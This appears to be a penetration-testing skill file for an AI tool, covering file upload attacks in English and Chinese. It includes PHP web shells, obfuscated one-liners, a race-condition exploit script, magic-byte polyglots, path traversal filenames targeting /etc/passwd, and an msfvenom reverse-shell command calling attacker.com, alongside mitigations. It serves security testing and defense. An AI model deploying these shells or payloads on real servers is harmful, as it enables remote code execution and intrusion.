---
name: file-upload-testing
description: File upload security testing covering extension bypass, content-type manipulation, and path traversal
---

# File Upload Testing

> **penkit51 AI** — professional penetration testing skill pack. Authorized testing only.

## Deep Exploitation Guide

# Insecure File Uploads

Upload surfaces are high risk: server-side execution (RCE), stored XSS, malware distribution, storage takeover, and DoS. Modern stacks mix direct-to-cloud uploads, background processors, and CDNs—authorization and validation must hold across every step.

## Attack Surface

- Web/mobile/API uploads, direct-to-cloud (S3/GCS/Azure) presigned flows, resumable/multipart protocols (tus, S3 MPU)
- Image/document/media pipelines (ImageMagick/GraphicsMagick, Ghostscript, ExifTool, PDF engines, office converters)
- Admin/bulk importers, archive uploads (zip/tar), report/template uploads, rich text with attachments
- Serving paths: app directly, object storage, CDN, email attachments, previews/thumbnails

## Reconnaissance

### Surface Map

- Endpoints/fields: upload, file, avatar, image, attachment, import, media, document, template
- Direct-to-cloud params: key, bucket, acl, Content-Type, Content-Disposition, x-amz-meta-*, cache-control
- Resumable APIs: create/init → upload/chunk → complete/finalize; check if metadata/headers can be altered late
- Background processors: thumbnails, PDF→image, virus scan queues; identify timing and status transitions

### Capability Probes

- Small probe files of each claimed type; diff resulting Content-Type, Content-Disposition, and X-Content-Type-Options on download
- Magic bytes vs extension: JPEG/GIF/PNG headers; mismatches reveal reliance on extension or MIME sniffing
- SVG/HTML probe: do they render inline (text/html or image/svg+xml) or download (attachment)?
- Archive probe: simple zip with nested path traversal entries and symlinks to detect extraction rules

## Detection Channels

### Server Execution

- Web shell execution (language dependent), config/handler uploads (.htaccess, .user.ini, web.config) enabling execution
- Interpreter-side template/script evaluation during conversion (ImageMagick/Ghostscript/ExifTool)

### Client Execution

- Stored XSS via SVG/HTML/JS if served inline without correct headers; PDF JavaScript; office macros in previewers

### Header and Render

- Missing X-Content-Type-Options: nosniff enabling browser sniff to script
- Content-Type reflection from upload vs server-set; Content-Disposition: inline vs attachment

### Process Side Effects

- AV/CDR race or absence; background job status allows access before scan completes; password-protected archives bypass scanning

## Core Payloads

### Web Shells and Configs

- PHP: GIF polyglot (starts with GIF89a) followed by `<?php echo 1; ?>`; place where PHP is executed
- .htaccess to map extensions to code (AddType/AddHandler); .user.ini (auto_prepend/append_file) for PHP-FPM
- ASP/JSP equivalents where supported; IIS web.config to enable script execution

### Stored XSS

- SVG with onload/onerror handlers served as image/svg+xml or text/html
- HTML file with script when served as text/html or sniffed due to missing nosniff

### MIME Magic Polyglots

- Double extensions: avatar.jpg.php, report.pdf.html; mixed casing: .pHp, .PhAr
- Magic-byte spoofing: valid JPEG header then embedded script; verify server uses content inspection, not extensions alone

### Archive Attacks

- Zip Slip: entries with `../../` to escape extraction dir; symlink-in-zip pointing outside target; nested zips
- Zip bomb: extreme compression ratios to exhaust resources in processors

### Toolchain Exploits

- ImageMagick/GraphicsMagick legacy vectors (policy.xml may mitigate): crafted SVG/PS/EPS invoking external commands or reading files
- Ghostscript in PDF/PS with file operators (%pipe%)
- ExifTool metadata parsing bugs; overly large or crafted EXIF/IPTC/XMP fields

### Cloud Storage Vectors

- S3/GCS presigned uploads: attacker controls Content-Type/Disposition; set text/html or image/svg+xml and inline rendering
- Public-read ACL or permissive bucket policies expose uploads broadly
- Object key injection via user-controlled path prefixes
- Signed URL reuse and stale URLs; serving directly from bucket without attachment + nosniff headers

## Advanced Techniques

### Resumable Multipart

- Change metadata between init and complete (e.g., swap Content-Type/Disposition at finalize)
- Upload benign chunks, then swap last chunk or complete with different source

### Filename and Path

- Unicode homoglyphs, trailing dots/spaces, device names, reserved characters to bypass validators
- Null-byte truncation on legacy stacks; overlong paths; case-insensitive collisions overwriting existing files

### Processing Races

- Request file immediately after upload but before AV/CDR completes
- Trigger heavy conversions (large images, deep PDFs) to widen race windows

### Metadata Abuse

- Oversized EXIF/XMP/IPTC blocks to trigger parser flaws
- Payloads in document properties of Office/PDF rendered by previewers

### Header Manipulation

- Force inline rendering with Content-Type + inline Content-Disposition
- Cache poisoning via CDN with keys missing Vary on Content-Type/Disposition

## Bypass Techniques

### Validation Gaps

- Client-side only checks; relying on JS/MIME provided by browser
- Trusting multipart boundary part headers blindly
- Extension allowlists without server-side content inspection

### Evasion Tricks

- Double extensions, mixed case, hidden dotfiles, extra dots (file..png), long paths with allowed suffix
- Multipart name vs filename vs path discrepancies; duplicate parameters and late parameter precedence

## Special Contexts

### Rich Text Editors

- RTEs allow image/attachment uploads and embed links; verify sanitization and serving headers

### Mobile Clients

- Mobile SDKs may send nonstandard MIME or metadata; servers sometimes trust client-side transformations

### Serverless and CDN

- Direct-to-bucket uploads with Lambda/Workers post-processing; verify security decisions are not delegated to frontends
- CDN caching of uploaded content; ensure correct cache keys and headers

## Testing Methodology

1. **Map the pipeline** - Client → ingress → storage → processors → serving. Note where validation and auth occur
2. **Identify allowed types** - Size limits, filename rules, storage keys, and who serves the content
3. **Collect baselines** - Capture resulting URLs and headers for legitimate uploads
4. **Exercise bypass families** - Extension games, MIME/content-type, magic bytes, polyglots, metadata payloads, archive structure
5. **Validate execution** - Can uploaded content execute on server or client?

## Validation

1. Demonstrate execution or rendering of active content: web shell reachable, or SVG/HTML executing JS when viewed
2. Show filter bypass: upload accepted despite restrictions with evidence on retrieval
3. Prove header weaknesses: inline rendering without nosniff or missing attachment
4. Show race or pipeline gap: access before AV/CDR; extraction outside intended directory
5. Provide reproducible steps: request/response for upload and subsequent access

## False Positives

- Upload stored but never served back; or always served as attachment with strict nosniff
- Converters run in locked-down sandboxes with no external IO and no script engines
- AV/CDR blocks the payload and quarantines; access before scan is impossible by design

## Impact

- Remote code execution on application stack or media toolchain host
- Persistent cross-site scripting and session/token exfiltration via served uploads
- Malware distribution via public storage/CDN; brand/reputation damage
- Data loss or corruption via overwrite/zip slip; service degradation via zip bombs

## Pro Tips

1. Keep PoCs minimal: tiny SVG/HTML for XSS, a single-line PHP/ASP where relevant
2. Always capture download response headers and final MIME; that decides browser behavior
3. Prefer transforming risky formats to safe renderings (SVG→PNG) rather than complex sanitization
4. In presigned flows, constrain all headers and object keys server-side
5. For archives, extract in a chroot/jail with explicit allowlist; drop symlinks and reject traversal
6. Test finalize/complete steps in resumable flows; many validations only run on init
7. Verify background processors with EICAR and tiny polyglots
8. When you cannot get execution, aim for stored XSS or header-driven script execution
9. Validate that CDNs honor attachment/nosniff
10. Document full pipeline behavior per asset type

## Summary

Secure uploads are a pipeline property. Enforce strict type, size, and header controls; transform or strip active content; never execute or inline-render untrusted uploads; and keep storage private with controlled, signed access.

## Platform Methodology

# 文件上传漏洞测试

## 概述

文件上传功能是Web应用常见功能，但存在多种安全风险。本技能提供文件上传漏洞的检测、利用和防护方法。

## 漏洞类型

### 1. 未验证文件类型

**仅前端验证：**
```javascript
// 可被绕过
if (!file.name.endsWith('.jpg')) {
  alert('只允许上传图片');
}
```

### 2. 文件内容未验证

**仅检查扩展名：**
```php
// 危险代码
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. 路径遍历

**未过滤文件名：**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. 文件名覆盖

**可预测的文件名：**
```
uploads/1.jpg
uploads/2.jpg
```

## 测试方法

### 1. 基础检测

**测试各种文件类型：**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**测试双扩展名：**
```
shell.php.jpg
shell.jpg.php
```

**测试大小写：**
```
shell.PHP
shell.PhP
```

### 2. 内容类型绕过

**修改Content-Type：**
```
Content-Type: image/jpeg
# 但文件内容是PHP代码
```

**Magic Bytes：**
```php
// 在PHP代码前添加图片头
GIF89a<?php phpinfo(); ?>
```

### 3. 解析漏洞

**Apache解析漏洞：**
```
shell.php.xxx  # Apache可能解析为PHP
```

**IIS解析漏洞：**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx解析漏洞：**
```
shell.jpg%00.php
```

### 4. 竞争条件

**文件上传后立即访问：**
```python
# 上传.php文件，在上传完成但删除前访问
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## 利用技术

### PHP WebShell

**基础WebShell：**
```php
<?php system($_GET['cmd']); ?>
```

**一句话木马：**
```php
<?php eval($_POST['a']); ?>
```

**绕过过滤：**
```php
<?php
$_GET['cmd']($_POST['a']);
// 使用: ?cmd=system
```

### .htaccess利用

**上传.htaccess：**
```
AddType application/x-httpd-php .jpg
```

**然后上传shell.jpg（实际是PHP代码）**

### 图片马

**GIF图片马：**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG图片马：**
```bash
# 使用工具将PHP代码嵌入PNG
python3 png2php.py shell.php shell.png
```

### 文件包含配合

**如果存在文件包含漏洞：**
```
# 上传包含PHP代码的图片
# 然后通过文件包含执行
?file=uploads/shell.jpg
```

## 绕过技术

### 扩展名绕过

**双扩展名：**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**大小写：**
```
shell.PHP
shell.PhP
```

**特殊字符：**
```
shell.php.
shell.php 
shell.php%20
```

### Content-Type绕过

**修改请求头：**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes绕过

**添加文件头：**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### 代码混淆

**使用短标签：**
```php
<?= system($_GET['cmd']); ?>
```

**使用变量：**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## 工具使用

### Burp Suite

1. 拦截文件上传请求
2. 修改文件名和内容
3. 测试各种绕过技术

### Upload Bypass

```bash
# 使用各种技术测试文件上传
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### WebShell生成

```bash
# 生成各种WebShell
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## 验证和报告

### 验证步骤

1. 确认可以上传恶意文件
2. 验证文件可以执行
3. 评估影响（命令执行、数据泄露等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和上传功能
- 可上传的文件类型和执行方式
- 完整的利用步骤和PoC
- 修复建议（文件类型验证、内容检查、安全存储等）

## 防护措施

### 推荐方案

1. **文件类型白名单**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **文件内容验证**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **重命名文件**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **隔离存储**
   - 文件存储在Web根目录外
   - 通过脚本代理访问
   - 禁用执行权限

5. **文件扫描**
   - 使用杀毒软件扫描
   - 检查文件内容
   - 移除可执行权限

6. **大小限制**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## 注意事项

- 仅在授权测试环境中进行
- 避免上传恶意文件到生产环境
- 测试后及时清理
- 注意不同服务器的解析差异

## Validation & Reporting

- Confirm every finding with reproducible PoC before reporting
- Document: severity (CVSS), affected asset, steps, evidence, remediation
- Use `record_vulnerability` when running inside the penkit51 platform
- Chain low-severity findings into higher-impact attack paths
- Never report without evidence — distinguish hypothesis from confirmed vuln

